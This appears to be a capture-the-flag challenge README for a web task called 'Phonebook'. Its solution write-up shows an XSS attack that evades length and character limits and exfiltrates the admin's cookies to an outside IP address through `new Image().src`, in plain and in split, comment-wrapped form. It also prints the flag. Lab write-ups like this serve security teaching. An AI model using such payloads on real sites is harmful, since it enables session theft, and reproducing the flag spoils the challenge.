# Phonebook

## Authors

* todo

## Category

* web

## Tags

_web_

## Description

One day I made a phone book application. After finishing I immediately realised I didn't need it
since no one talks to me anyway... :(. Anyway, go hack it.

## Difficulty

* hard

## Points

400

## Hints

_None_

## Files

_None_

## Setup

* Run the provided docker file

## Solution

_Code can be found in `solve.py`_

### Summary

This challenge involves performing XSS, but with limitations on character set and payload length.

#### Restirctions

We notice that we can trivially get XSS by putting `<script>` into the phonebook name selection. However, the number of characters here is limited so we cannot fit a full xss payload. We hence append a `/*` onto the end of the script to comment out everything else on the page.

We also note that every phone number is also XSSable, but the length is extremely limited (7 characters), and we cannot have `A-Za-z` or backticks. We can however have all other symbols. We can freely write javascript here as long as we comment out the rest of the line. This leaves us with `*/ppp/*` 3 character payloads.

We additionaly find that we can inject content into the number_owner field, although there are character restirctions on the content. We do note however that we can have ascii characters and `*/`, this lets us again repeat the strategy above. This field also has a length restriction but this should not pose a large issue for the exploit.

#### Payload

As this is a XSS challenge there are a few typical payloads we can trial. We will use `(new Image).src='//12.34.456.789:1234/'+document.cookies` in order to steal the admin user's cookies. The main challenge here is in
how to encode this payload.

#### Encoding

We split the payload into two classes of characters, symbols/numbers and letters. We aim to place symbols/numbers into the number field and letters into the number_owner field. Our exploit then looks like this.

```text
(                           new Image
).                          src
='//12.334.456.789:1234/'+  document
.                           cookies
```

However this obviously does not fit in the character restrictions. Additionally html content in between each section of the payload would cause javascript syntax errors.

#### Exploit 
We can overcome the latter issue by first wrapping each statement in a `*/<content>/*` block. This will ignore the html content but reduce the number of character avaliable for symbols to 3/phonenumber.
We can then use javascript string concatenation to separate the long series of symbols.

_A space is inserted between `*/` and content, this should not be present in the actul exploit, and is there for readability_

```text
*/ ( /*     */ new Image /*
*/ ). /*    */ src /*
*/ = /*     *//*
*/ '/' /*   *//*
*/ + /*     *//*
*/ '/' /*   *//*
*/ +1 /*    *//*
*/ +2 /*    *//*
*/ + /*     *//*
*/ '.' /*   *//*
*/ +3 /*    *//*
*/ +4+ /*   *//*
*/ '.' /*   *//*
*/ +56 /*   *//*
*/ +7+ /*   *//*
*/ '.' /*   *//*
*/ +89 /*   *//*
*/ +0+ /*   *//*
*/ ':' /*   *//*
*/ +12 /*   *//*
*/ +34 /*   *//*
*/ + /*     *//*
*/ '/' /*   *//*
*/ + /*     */ document /*
*/ . /*     */ cookie /*
```

### Flag

`ATLASSIAN{1ll_0p3n_a_J1R4_t1CK3T_f0r_it}`